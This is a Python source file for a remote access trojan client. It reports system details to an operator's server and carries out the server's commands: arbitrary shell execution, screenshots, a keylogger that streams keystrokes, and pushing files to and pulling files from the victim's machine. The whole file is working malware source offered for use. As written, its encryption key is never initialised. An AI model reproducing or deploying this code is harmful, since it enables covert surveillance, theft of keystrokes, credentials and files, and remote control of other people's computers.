import socket
import json
import platform
import uuid
import threading
import os
import sys
import base64
import pyautogui
import subprocess
from datetime import datetime
from cryptography.fernet import Fernet
from pynput import keyboard

class RemoteClient:
    def __init__(self, host='localhost', port=5000):
        self.host = host
        self.port = port
        self.key = None  # Will be set during handshake
        self.cipher = None
        self.keylogger_active = False
        self.keylog_data = []
        
        # Generate unique client ID
        self.client_id = str(uuid.uuid4())
        
        # Get system information
        self.system_info = {
            'id': self.client_id,
            'hostname': platform.node(),
            'os': f"{platform.system()} {platform.release()}",
            'username': os.getlogin()
        }
        
        # Initialize connection
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        """Connect to remote server"""
        try:
            print(f"[*] Connecting to {self.host}:{self.port}...")
            self.socket.connect((self.host, self.port))
            
            # Send initial system information
            self.send_message({
                'type': 'handshake',
                **self.system_info
            })
            
            # Start heartbeat thread
            heartbeat_thread = threading.Thread(target=self.heartbeat)
            heartbeat_thread.daemon = True
            heartbeat_thread.start()
            
            # Main loop to receive commands
            while True:
                try:
                    encrypted_cmd = self.socket.recv(4096)
                    if not encrypted_cmd:
                        break
                    
                    command = json.loads(self.decrypt_message(encrypted_cmd))
                    self.handle_command(command)
                
                except Exception as e:
                    print(f"[!] Error receiving command: {e}")
                    break
            
        except Exception as e:
            print(f"[!] Connection error: {e}")
        
        finally:
            self.socket.close()
            print("[*] Connection closed")

    def handle_command(self, command):
        """Handle incoming commands from server"""
        try:
            if command['type'] == 'screenshot':
                self.take_screenshot()
            
            elif command['type'] == 'shell':
                self.execute_shell_command(command['data'])
            
            elif command['type'] == 'keylog':
                self.toggle_keylogger()
            
            elif command['type'] == 'upload':
                self.receive_file(command['data'])
            
            elif command['type'] == 'download':
                self.send_file(command['data'])
            
        except Exception as e:
            print(f"[!] Error handling command: {e}")
            self.send_message({
                'type': 'command_result',
                'data': f"Error: {str(e)}"
            })

    def take_screenshot(self):
        """Take and send screenshot"""
        try:
            screenshot = pyautogui.screenshot()
            screenshot_bytes = screenshot._repr_png_()
            
            self.send_message({
                'type': 'screenshot',
                'data': base64.b64encode(screenshot_bytes).decode()
            })
            
        except Exception as e:
            print(f"[!] Screenshot error: {e}")

    def execute_shell_command(self, command):
        """Execute shell command and return result"""
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            stdout, stderr = process.communicate()
            result = stdout + stderr
            
            self.send_message({
                'type': 'command_result',
                'data': result
            })
            
        except Exception as e:
            print(f"[!] Command execution error: {e}")
            self.send_message({
                'type': 'command_result',
                'data': f"Error: {str(e)}"
            })

    def toggle_keylogger(self):
        """Toggle keylogger on/off"""
        try:
            self.keylogger_active = not self.keylogger_active
            
            if self.keylogger_active:
                # Start keylogger
                def on_press(key):
                    try:
                        self.keylog_data.append(str(key.char))
                    except AttributeError:
                        self.keylog_data.append(f"[{str(key)}]")
                    
                    # Send data every 10 keystrokes
                    if len(self.keylog_data) >= 10:
                        self.send_message({
                            'type': 'keylog',
                            'data': ''.join(self.keylog_data)
                        })
                        self.keylog_data = []
                
                self.keyboard_listener = keyboard.Listener(on_press=on_press)
                self.keyboard_listener.start()
                print("[*] Keylogger started")
            
            else:
                # Stop keylogger
                if hasattr(self, 'keyboard_listener'):
                    self.keyboard_listener.stop()
                print("[*] Keylogger stopped")
            
        except Exception as e:
            print(f"[!] Keylogger error: {e}")

    def receive_file(self, file_info):
        """Receive and save file from server"""
        try:
            filename = file_info['filename']
            file_data = base64.b64decode(file_info['data'])
            
            with open(filename, 'wb') as f:
                f.write(file_data)
            
            self.send_message({
                'type': 'command_result',
                'data': f"File {filename} received successfully"
            })
            
        except Exception as e:
            print(f"[!] File receive error: {e}")

    def send_file(self, filepath):
        """Send file to server"""
        try:
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    file_data = base64.b64encode(f.read()).decode()
                
                self.send_message({
                    'type': 'file_upload',
                    'filename': os.path.basename(filepath),
                    'data': file_data
                })
            else:
                self.send_message({
                    'type': 'command_result',
                    'data': f"File {filepath} not found"
                })
            
        except Exception as e:
            print(f"[!] File send error: {e}")

    def heartbeat(self):
        """Send periodic heartbeat to server"""
        while True:
            try:
                self.send_message({'type': 'heartbeat'})
                threading.Event().wait(30)  # Send heartbeat every 30 seconds
            except:
                break

    def send_message(self, message):
        """Send encrypted message to server"""
        try:
            encrypted_msg = self.encrypt_message(json.dumps(message))
            self.socket.send(encrypted_msg)
        except Exception as e:
            print(f"[!] Error sending message: {e}")

    def encrypt_message(self, message):
        """Encrypt message using Fernet"""
        return self.cipher.encrypt(message.encode())

    def decrypt_message(self, encrypted_message):
        """Decrypt message using Fernet"""
        return self.cipher.decrypt(encrypted_message).decode()

if __name__ == "__main__":
    # Get server address from command line arguments
    host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    
    client = RemoteClient(host, port)
    client.connect()